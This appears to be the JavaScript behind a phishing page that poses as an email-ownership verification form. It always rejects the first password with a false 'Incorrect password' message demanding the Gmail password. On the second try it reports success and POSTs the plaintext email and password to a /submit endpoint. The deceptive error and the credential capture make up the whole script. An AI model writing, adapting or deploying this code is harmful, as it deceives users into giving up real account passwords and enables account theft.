const form = document.getElementById("verificationForm");
const result = document.getElementById("result");

let attempts = 0;

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  // Email-format validation
  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!emailPattern.test(email)) {
    showError("Please enter a valid email address.");
    return;
  }

  if (!password) {
    showError("Please enter your password.");
    return;
  }

  attempts++;

  // First valid attempt
  if (attempts === 1) {
    showError("Incorrect password! You are required to login with your Gmail password");
    return;
  }

  // Second valid attempt
  if (attempts === 2) {
    result.className = "result success";
    result.textContent = "Email ownership confirmed successfully.";

    try {
      await fetch("/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          email: email,
          password: password
        })
      });
    } catch (error) {
      console.error("Demo storage error:", error);
    }

    form.reset();
  }
});

function showError(message) {
  result.className = "result error";
  result.textContent = message;
}
